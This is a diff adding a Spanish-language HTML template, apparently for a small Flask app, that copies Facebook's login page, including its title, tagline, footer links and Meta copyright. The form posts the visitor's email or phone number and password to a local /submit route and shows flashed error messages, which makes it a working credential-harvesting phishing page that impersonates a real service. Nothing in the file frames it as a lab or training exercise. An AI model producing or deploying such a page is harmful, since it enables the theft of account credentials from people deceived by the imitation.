@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <title>Iniciar sesión en Facebook</title>
+    <link rel="stylesheet" href="../static/css/style.css">
+</head>
+<body>
+    <div class="container">
+    <div class="left">
+        <h1>Facebook</h1>
+        <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+    </div>
+
+    <!-- NUEVO CONTENEDOR para que el create-page-container quede abajo de right -->
+    <div class="right-section">
+        <div class="right">
+        <form action="/submit" method="POST">
+            <div class="form-group">
+            <input type="text" name="correo" placeholder="Correo electrónico o número de móvil" required>
+            {% with messages = get_flashed_messages() %}
+            {% if messages %}
+                <div class="error-message">
+                {% for message in messages %}
+                    <p>{{ message }}</p>
+                {% endfor %}
+                </div>
+            {% endif %}
+            {% endwith %}
+
+            </div>
+            <div class="form-group">
+            <input type="password" name="contrasena" placeholder="Contraseña" required />
+            </div>
+            <button type="submit">Iniciar sesión</button>
+            <a href="#" class="forgot-pass">¿Olvidaste tu contraseña?</a>
+        </form>
+        <a href="/create_account" class="create-account">Crear nueva cuenta</a>
+        </div>
+
+        <!-- Este queda abajo del cuadro -->
+        <div class="create-page-container">
+        <p class="create-page-text">
+        <a href="#" class="create-pagine"><strong>Crea una página</strong></a> para una celebridad, una marca <br>o un negocio.
+        </p>
+
+        </div>
+    </div>
+    </div>
+
+
+    <div class="footer">
+        Español
+        English (US)
+        Français (France)
+        Português (Brasil)
+        Deutsch
+        Italiano
+        中文(简体)
+        Svenska
+        العربية
+        हिन्दी
+        日本語
+        <br><br>
+        Registrarte Iniciar sesión Messenger Facebook Lite Video Meta Pay Tienda de Meta Meta Quest Ray-Ban Meta Meta AI Más contenido de Meta AI Instagram Threads Centro de información de votación Política de privacidad Centro de privacidad Información Crear anuncio Crear página Desarrolladores Empleo Cookies Opciones de anuncios Condiciones Ayuda Importación de contactos y no usuarios Configuración Registro de actividad Meta © 2025
+    </div>
+</body>
+</html>
